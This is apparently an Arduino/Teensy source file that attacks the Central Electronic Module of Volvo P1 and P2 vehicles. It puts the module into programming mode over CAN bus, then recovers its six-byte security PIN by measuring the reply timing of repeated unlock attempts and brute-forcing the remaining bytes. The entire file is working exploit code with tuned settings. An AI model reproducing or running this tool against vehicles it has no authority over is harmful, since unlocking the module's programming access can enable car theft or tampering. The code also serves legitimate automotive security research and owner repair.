// SPDX-License-Identifier: GPL-3.0
/*
 * Copyright (C) 2019, 2020 Vitaly Mayatskikh <v.mayatskih@gmail.com>
 *
 * This work is licensed under the terms of the GNU GPL, version 3.
 *
 *
 * P1 tested settings;
 *        Teensy 4.0
 *        SAMPLES = 5 Seems to work reliably
 *        CALC_BYTES = 4 does seem to work fine, 3 might be more reliable
 *        BUCKETS_PER_US 4
 *        CPU SPEED: 600MHz (default)
 *        OPTIMIZE: Fastest (default)
 * 
 * MCP2515 Library: https://github.com/Seeed-Studio/CAN_BUS_Shield.git
 *
 */

#include <SPI.h>
#include <mcp_can.h>
#include <mcp_can_dfs.h>

/* tunables */

//#define PLATFORM_P1 /* P1 Platform (S40/V50/C30/C70) MC9S12xxXXX based */
#define PLATFORM_P2 /* P2 Platform (S60/S80/V70/XC70/XC90*/

//#define HAS_CAN_LS        /* CEM is in the car, both LS and HS CAN-buses need to go into programming mode */
#define SAMPLES        30   /* how many samples to do on a sequence, more is better (up to 100) */
#define CALC_BYTES     3    /* how many PIN bytes to calculate (1 to 4), the rest is brute-forced */
#define NUM_LOOPS      1000 /* how many loops to do when calculating crack rate */


#if defined(PLATFORM_P2)
#define BUCKETS_PER_US 1                           /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
#define CEM_REPLY_DELAY_US (80*BUCKETS_PER_US)     /* minimum time in us for CEM to reply for PIN unlock command (approx) */
int shuffle_order[] = { 3, 1, 5, 0, 2, 4 };

#elif defined(PLATFORM_P1)
#define BUCKETS_PER_US 4                            /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
#define AVERAGE_DELTA_MIN   (16*BUCKETS_PER_US)     /* Buckets to look at before the average */
#define AVERAGE_DELTA_MAX   (32*BUCKETS_PER_US)     /* Buckets to look at after the average  */
#define CEM_REPLY_DELAY_US  (200*BUCKETS_PER_US)    /* minimum time in us for CEM to reply for PIN unlock command (approx) */
/* P1 processes the key in order
   The order in flash is still shuffled though
   Order in flash: 5, 2, 1, 4, 0, 3
*/
int shuffle_order[] = { 0, 1, 2, 3, 4, 5 };

#else
#error Platform required // Must pick PLATFORM_P1 or PLATFORM_P2 above
#endif

#define CAN_HS_CS_PIN 2  /* MCP2515 chip select pin CAN-HS */
#define CAN_LS_CS_PIN 3  /* MCP2515 chip select pin CAN-LS */
#define CAN_INTR_PIN  4  /* MCP2515 interrupt pin CAN-HS */
#define CAN_L_PIN    10  /* CAN-HS- wire, directly connected (CAN-HS, Low)*/
#define TSC ARM_DWT_CYCCNT
#define MCP2515_CLOCK MCP_8MHz /*Different boards may have a different crystal, Seed Studio is MCP_16MHZ */
#define CEM_REPLY_US (200 * BUCKETS_PER_US)
#define printf Serial.printf

#define CAN_HS_BAUD CAN_500KBPS
#define CAN_LS_BAUD CAN_125KBPS

#define PIN_LEN       6

MCP_CAN CAN_HS(CAN_HS_CS_PIN);
MCP_CAN CAN_LS(CAN_LS_CS_PIN);

bool cem_print = true;
long average_response = 0;

void cem_send_bus(MCP_CAN &bus, unsigned long id, byte *d)
{
#ifndef HAS_CAN_LS
  if (&bus == &CAN_LS)
    return;
#endif
  if (cem_print)
    printf("send: ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n", id, d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);
  bus.sendMsgBuf(id, 1, 8, d);
}

void cem_send(unsigned long id, byte *d)
{
  cem_send_bus(CAN_HS, id, d);
}

bool cem_receive(bool wait, unsigned long *id, byte *data)
{
  byte d[8] = { 0 };
  byte len;
  int ret;
  unsigned long can_id = 0;

  do {
    ret = (CAN_HS.checkReceive() == CAN_MSGAVAIL);
    if (ret) {
      CAN_HS.readMsgBuf(&len, d);
      can_id = CAN_HS.getCanId();
    }
  } while (!ret && wait);

  if (id)
    *id = can_id;
  if (data)
    memcpy(data, d, 8);

  if (ret && cem_print)
    printf("recv: ID=%08x data=%02x %02x %02x %02x %02x %02x %02x %02x\n", can_id, d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);

  return ret;
}

byte to_bcd(byte b)
{
  return ((b / 10) << 4) | (b % 10);
}

byte from_bcd(byte b)
{
  return ((b >> 4) * 10) + (b & 0xf);
}

int crack_rate;

int cem_print_crack_rate()
{
  byte pin[PIN_LEN] = { 0 };
  long start, end;
  int lat;
  bool cp = cem_print;
  int rate;
  cem_print = false;
  average_response = 0;

  start = millis();
  for (int i = 0; i < NUM_LOOPS; i++) {
    pin[0] = random(0, 255); // Found better average calculation using random number here
    cem_unlock(pin, &lat, true);
    average_response += lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
  }
  end = millis();
  average_response = average_response / NUM_LOOPS;
  rate = 1000 * NUM_LOOPS / (end - start);
  printf("%d pins in %d ms, %d pins/s, average response: %d\n", NUM_LOOPS, (end - start), rate, average_response);
  cem_print = cp;

  return rate;
}

volatile bool can_intr;

void cem_intr()
{
  can_intr = true;
}

bool cem_unlock(byte *pin, int *lat, bool shuffle)
{
  byte b[8] = { 0x50, 0xbe };
  byte *p = b + 2;
  long start, end;
  byte len;
  unsigned long id;
  long cur, max = 0;
  bool prev_pin = true;

  if (shuffle) {
    p[shuffle_order[0]] = pin[0];
    p[shuffle_order[1]] = pin[1];
    p[shuffle_order[2]] = pin[2];
    p[shuffle_order[3]] = pin[3];
    p[shuffle_order[4]] = pin[4];
    p[shuffle_order[5]] = pin[5];
  } else {
    memcpy(p, pin, 6);
  }
  cem_send(0xffffe, b);
  can_intr = false;
  long mt = 0;
  for (cur = 0, start = TSC; !can_intr && mt < CEM_REPLY_DELAY_US * clockCyclesPerMicrosecond();) {
    if (digitalRead(CAN_L_PIN)) {
      cur++;
      continue;
    }
    end = TSC;
    if (cur > max) {
      max = cur;
      cur = 0;
      mt = end - start;
    }
    while (!(digitalRead(CAN_L_PIN)))
      start = TSC;
  }
  cem_receive(true, &id, b);
  *lat = mt;

  return b[2] == 0x00;
}

void cem_read_part_number()
{
  unsigned long id;
  byte d[8];
  int ret;
  byte data[8] = { 0x50, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

  printf("reading part number\n");
  cem_send(0xFFFFE, data);

  ret = cem_receive(true, &id, d);
}

void cem_programming_mode_on()
{
  byte data[8] = { 0xFF, 0x86, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  int time = 5000;
  int _delay = 5;
  int cp = cem_print;

  printf("sending CEM into programming mode\n");
  while (time > 0) {
    cem_send_bus(CAN_HS, 0xffffe, data);
    cem_send_bus(CAN_LS, 0xffffe, data);
    cem_print = false;
    time -= _delay;
    delay(_delay);
  }
  cem_print = cp;
}

void cem_reset()
{
  byte data[8] = { 0xFF, 0xc8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
  printf("reset CEM\n");
  for (int i = 0; i < 50; i++) {
    cem_send_bus(CAN_HS, 0xffffe, data);
    cem_send_bus(CAN_LS, 0xffffe, data);
    delay(100);
  }
}

struct seq {
  byte b;
  int lat;
} s[100] = { 0 };

int seq_max(const void *a, const void *b)
{
  struct seq *_a = (struct seq *)a;
  struct seq *_b = (struct seq *)b;
  return _b->lat - _a->lat;
}

void crack_pin_pos(byte *pin, int pos)
{
  int h[CEM_REPLY_US];
  int lat;
  bool shuffle = true;
  cem_print = false;
  int from = 0, to = 10000;

  memset(s, 0, sizeof(s));
  for (int i = from; i < to; i++) {
    unsigned int m = i;
    pin[pos + 1] = to_bcd(m % 100); m /= 100;
    pin[pos + 0] = to_bcd(m % 100); m /= 100;

    if ((i % 100) == 0)
      printf("%02x %02x %02x %02x %02x %02x: ", pin[0], pin[1], pin[2], pin[3], pin[4], pin[5]);

    if ((i % 100) == 0) {
      memset(h, 0, sizeof(h));
    }

    for (int j = 0; j < SAMPLES; j++) {
      pin[pos + 2] = to_bcd(j);
      cem_unlock(pin, &lat, shuffle);
      int idx = lat / (clockCyclesPerMicrosecond() / BUCKETS_PER_US);
      if (idx >= CEM_REPLY_US)
        idx = CEM_REPLY_US - 1;
      h[idx]++;
    }
    pin[pos + 2] = 0;

#if defined(PLATFORM_P2)
    if ((i % 100) == 99) {
      int prod = 0;
      for (int k = 0; k < CEM_REPLY_US; k++) {
        if (k > 81 && k < 95)
          printf("%03d ", h[k]);
        prod += h[k] * k;
      }
      printf(": %d\n", prod);

      s[i / 100].b = pin[pos + 0];
      s[i / 100].lat  = prod;
    }
#elif defined(PLATFORM_P1)
    if ((i % 100) == 99) {
      long prod = 0;
      int sum = 0;
      for (int k = (average_response - AVERAGE_DELTA_MIN); k < (average_response + AVERAGE_DELTA_MAX); k++) {
        if ( k > average_response - 8 && k < average_response + 16) {
          printf("%03d ", h[k]);
        }
        prod += h[k] * k;
        sum += h[k];
      }
      prod = prod / sum; // Average
      printf(": %d\n", prod);

      s[i / 100].b = pin[pos + 0];
      s[i / 100].lat  = prod;
    }
#endif

  }

  qsort(s, 100, sizeof(struct seq), seq_max);
  for (int i = 0; i < 25; i++) {
    printf("%d: %02x = %d\n", i, s[i].b, s[i].lat);
  }

  average_response = s[0].lat;

  printf("pin[%d] candidate: %02x lat %d\n", pos, s[0].b, s[0].lat);
  pin[pos] = s[0].b;
  pin[pos + 1] = 0;
}

void cem_crack_pin(int max_bytes)
{
  byte pin[PIN_LEN] = { 0 };
  long start = millis(), end;
  bool cracked = false;

  printf("calculating bytes 0-%d\n", max_bytes - 1);
  crack_rate = cem_print_crack_rate();

  for (int i = 0; i < max_bytes; i++)
    crack_pin_pos(pin, i);

  int n = max_bytes;

  for (int i = 0; i < PIN_LEN; i++) {
    printf("0x%02x ", pin[i]);
  }
  printf(" -- brute forcing bytes %d to %d (%d bytes), will take up to %d seconds\n", n, PIN_LEN - 1, PIN_LEN - n, (int)(pow(100, PIN_LEN - n) / crack_rate));

  for (unsigned long m = 0; m < pow(100, (PIN_LEN - n)); m++) {
    unsigned long f = m;
    for (int k = n; k < PIN_LEN; k++) {
      pin[k] = to_bcd(f % 100);
      f /= 100;
    }
    int lat;
    if (cem_unlock(pin, &lat, true)) {
      printf("found PIN: 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x 0x%02x\n", pin[3], pin[1], pin[5], pin[0], pin[2], pin[4]);
      cracked = true;
      break;
    }
  }
  end = millis();
  printf("PIN is %scracked in %3.2f seconds\n", cracked ? "" : "NOT ", (end - start) / 1000.0);
  printf("done\n");
}

void setup() {
  Serial.begin(115200);
  delay(3000);
  pinMode(CAN_L_PIN, INPUT_PULLUP);
  pinMode(CAN_INTR_PIN, INPUT);
  printf("F_CPU %d\n", F_CPU);
  printf("CEM_REPLY_DELAY_US %d\n", CEM_REPLY_DELAY_US);
  printf("clockCyclesPerMicrosecond %d\n", clockCyclesPerMicrosecond());
  printf("CAN_HS init\n");
  while (MCP2515_OK != CAN_HS.begin(CAN_HS_BAUD, MCP2515_CLOCK)) {
    delay(1000);
  }
  attachInterrupt(digitalPinToInterrupt(CAN_INTR_PIN), cem_intr, FALLING);

#ifdef HAS_CAN_LS
  printf("CAN_LS init\n");
  while (MCP2515_OK != CAN_LS.begin(CAN_LS_BAUD, MCP_8MHz)) {
    delay(1000);
  }
#endif

  printf("done\n");

  while (cem_receive(false, NULL, NULL));
  cem_programming_mode_on();
  while (cem_receive(false, NULL, NULL));

  cem_read_part_number();
  cem_crack_pin(CALC_BYTES);
  cem_reset();
}

void loop() {
}
